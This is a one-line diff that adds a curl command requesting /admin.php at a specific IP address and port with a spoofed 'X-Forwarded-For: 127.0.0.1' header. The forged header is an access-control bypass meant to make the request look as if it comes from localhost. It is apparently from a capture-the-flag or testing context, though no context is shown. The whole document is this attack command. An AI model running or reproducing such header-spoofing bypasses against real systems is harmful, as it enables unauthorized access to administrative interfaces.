@@ -1,0 +1,1 @@
+curl -XGET http://34.107.12.125:31262/admin.php -H 'X-Forwarded-For: 127.0.0.1'
